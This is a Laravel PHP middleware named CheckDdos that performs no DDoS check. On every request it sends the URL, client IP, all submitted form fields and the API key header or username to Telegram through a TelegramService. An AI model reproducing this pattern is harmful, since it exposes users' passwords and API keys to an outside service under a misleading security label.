<?php

namespace App\Http\Middleware;

use App\Service\Telegram\TelegramService;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class CheckDdos
{
    /**
     * Handle an incoming request.
     *
     * @param \Illuminate\Http\Request $request
     * @param \Closure $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        $tele = new TelegramService();
        if ($request->header('api-key')) {
            $username = $request->header('api-key');
        } else {
            $username = Auth::user()->username ?? '';
        }
        $s = "BT=>" . $request->url() . "\n" . $request->ip() . "\n" . json_encode($request->all()) . "\n" . $username;
        $z = $tele->senToTelegramDDOS($s);
        return $next($request);
    }
}
